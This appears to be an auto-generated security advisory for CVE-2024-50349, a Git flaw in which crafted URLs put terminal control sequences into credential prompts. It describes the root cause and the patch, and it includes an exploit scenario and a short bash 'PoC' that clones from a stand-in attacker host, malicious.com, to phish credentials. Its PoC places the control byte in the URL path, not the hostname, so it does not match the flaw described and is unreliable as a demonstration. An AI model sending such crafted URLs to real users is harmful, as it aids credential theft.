# CVE-2024-50349 Detailed Report

## Summary
CVE-2024-50349 is a vulnerability in Git, a widely used distributed version control system. The vulnerability is classified under multiple CWEs, including:
- **CWE-116**: Improper Encoding or Escaping of Output
- **CWE-147**: Improper Neutralization of Input Terminators
- **CWE-150**: Improper Neutralization of Escape, Meta, or Control Sequences

The affected version of Git is **v2.40.3**. The vulnerability arises when Git prompts users for credentials via a terminal without using a credential helper. During this prompt, the hostname is displayed, and any URL-encoded parts are decoded and printed verbatim. This behavior allows attackers to craft malicious URLs containing ANSI escape sequences, which can mislead users into providing their credentials for trusted Git hosting sites while actually sending them to untrusted sites controlled by the attacker.

## Root Cause of the Vulnerability
The root cause of this vulnerability lies in the way Git handles user prompts for credentials. Specifically, when Git requests credentials, it does not sanitize the output that includes control characters. This allows attackers to inject control sequences into the username or hostname, which can manipulate the terminal's display. 

The provided patch addresses this issue by introducing a new function, `git_prompt()`, which sanitizes the displayed text. The patch ensures that control characters are replaced with question marks, preventing misleading prompts. The changes in the patch include:
- Modifications to the `credential.c` file to add a `sanitize_prompt` configuration option.
- Updates to the `credential_format()` function to ensure that hostnames and ports are properly encoded, preventing invalid characters from being displayed.

The patch effectively neutralizes the risk of control sequences being used to mislead users during credential prompts.

## Exploitation Details
To exploit this vulnerability, an attacker would need to craft a malicious URL that includes control sequences in the username or hostname. When a user attempts to clone or interact with a repository using this URL, Git would prompt for credentials, displaying the crafted hostname with the control sequences interpreted by the terminal. This could trick the user into entering their credentials, which would then be sent to the attacker's server.

### Example Exploit Scenario
1. An attacker creates a Git repository with a malicious URL, such as:
   ```
   https://malicious.com/%07latrix%20Lestrange
   ```
2. The attacker shares this URL with a victim, convincing them to clone the repository.
3. When the victim runs the command:
   ```
   git clone https://malicious.com/%07latrix%20Lestrange
   ```
4. Git prompts the user for their username and password, displaying the hostname with control sequences that could manipulate the terminal output.
5. The victim, misled by the prompt, enters their credentials, which are then sent to the attacker's server.

## Environment Setup Requirements
- **Port**: Not explicitly mentioned in the advisory, but typical Git operations use port 443 for HTTPS.
- **Target Endpoint**: The exact API path is not specified, but the exploit would involve a malicious Git URL.
- **Explicit Configuration**: The advisory mentions that users can configure `credential.sanitizePrompt` to `false` to override the default behavior, which is set to `true` in the patch.

## Complete PoC Code
The advisory does not provide a specific proof-of-concept code snippet, but the following is a representation of how the exploit could be structured based on the information provided:

```bash
# Malicious Git URL
MALICIOUS_URL="https://malicious.com/%07latrix%20Lestrange"

# Attempt to clone the repository
git clone $MALICIOUS_URL
```

This command would trigger the vulnerability, leading to a misleading prompt for credentials. 

In summary, CVE-2024-50349 highlights a significant security risk in Git's handling of user prompts for credentials, which can be exploited through crafted URLs containing control sequences. The provided patches effectively mitigate this risk by sanitizing the output displayed to users.